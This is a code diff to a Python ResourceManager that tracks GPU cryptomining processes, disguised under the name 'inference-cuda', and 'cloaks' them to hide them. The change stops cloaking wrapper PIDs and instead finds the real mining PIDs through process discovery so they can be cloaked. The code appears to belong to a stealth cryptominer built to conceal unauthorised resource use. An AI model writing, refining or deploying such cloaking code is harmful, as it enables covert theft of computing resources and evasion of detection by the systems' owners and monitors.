@@ -276,6 +276,9 @@ class ResourceManager(IResourceManager):
         self.worker_id = next(self._counter)
         self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
         
+        # ✅ NEW: Wrapper PID tracking - ignore wrapper PIDs, only cloak real mining PIDs
+        self.ignored_wrapper_pids = set()  # Track wrapper PIDs to ignore during process discovery
+        
         # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
         self.strategy_metrics: Dict[int, Dict[str, Any]] = {}  # PID -> metrics data
         
@@ -414,37 +417,31 @@ class ResourceManager(IResourceManager):
     # CPU event handling completely removed - GPU-only mode
 
     def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
-        """Handle GPU mining events - PID Propagation Flow Step 2 - **UPDATED FOR NEW EVENT FORMAT** (cập nhật cho định dạng sự kiện mới)"""
+        """Handle GPU mining events - PID Propagation Flow Step 2 - **WRAPPER PID DETECTION** (phát hiện PID wrapper)"""
         try:
-            # ✅ SIMPLIFIED: Always expect real mining PID (wrapper_pid removed from start_mining.py)
-            pid = payload.get('pid')
-            role = payload.get('role', 'real')
+            # ✅ WRAPPER DETECTION: PID from EventBus is wrapper PID, not real mining PID
+            wrapper_pid = payload.get('pid')
+            role = payload.get('role', 'wrapper')  # Default to wrapper since EventBus sends wrapper PID
             process_name = payload.get('process_name', 'inference-cuda')
             status = payload.get('status')
             
-            # ✅ VALIDATION: Ensure we have real mining PID
-            if not pid:
+            # ✅ VALIDATION: Ensure we have wrapper PID
+            if not wrapper_pid:
                 self.logger.warning("⚠️ No PID in mining event payload - skipping")
                 return
                 
-            if pid and status == 'running':
-                self.logger.info(f"🎮 ResourceManager received GPU PID registered: PID={pid}")
+            if wrapper_pid and status == 'running':
+                self.logger.info(f"🎮 ResourceManager received GPU PID registered: PID={wrapper_pid} (WRAPPER)")
                 self.logger.debug(f"[DEBUG] GPU event payload: {payload}")
                 
-                # ✅ ENHANCED: Create MiningProcess với explicit classification
-                mining_process = MiningProcess(pid, process_name, is_gpu=True)  # Explicit GPU
-                self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
+                # ✅ NEW LOGIC: Add wrapper PID to ignored list instead of cloaking
+                self.ignored_wrapper_pids.add(wrapper_pid)
+                self.logger.info(f"🚫 Added wrapper PID {wrapper_pid} to ignored list - will not be cloaked")
+                self.logger.info(f"📋 Current ignored wrapper PIDs: {list(self.ignored_wrapper_pids)}")
                 
-                # Add to tracking list
-                with self.mining_processes_lock:
-                    self.mining_processes.append(mining_process)
-                    self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
-                
-                # ✅ STREAMLINED: Enqueue GPU cloaking
-                self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for GPU PID {pid}")
-                self.enqueue_cloaking(mining_process)
-                
-                self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
+                # ✅ INFO: Explain that real mining PID will be discovered via process discovery
+                self.logger.info(f"ℹ️ Real mining PID will be discovered automatically via periodic process discovery")
+                self.logger.info(f"✅ Wrapper PID {wrapper_pid} processed: added to ignore list")
                 
         except Exception as e:
             error_msg = f"❌ Error handling GPU mining event: {e}"
@@ -742,7 +739,13 @@ class ResourceManager(IResourceManager):
                         
                         self.logger.info(f"🔍 [PROCESS DISCOVERY] Found {proc_name} PID={pid} (GPU)")
                         
-                        # Create MiningProcess object
+                        # ✅ NEW: Skip wrapper PIDs that should be ignored
+                        if pid in self.ignored_wrapper_pids:
+                            self.logger.info(f"🚫 [PROCESS DISCOVERY] Skipping wrapper PID {pid} - in ignored list")
+                            self.logger.info(f"📋 [PROCESS DISCOVERY] Ignored wrapper PIDs: {list(self.ignored_wrapper_pids)}")
+                            continue
+                        
+                        # Create MiningProcess object for real mining PID only
                         mining_process = MiningProcess(pid, proc_name, is_gpu=is_gpu)
                         
                         # Add to tracking list
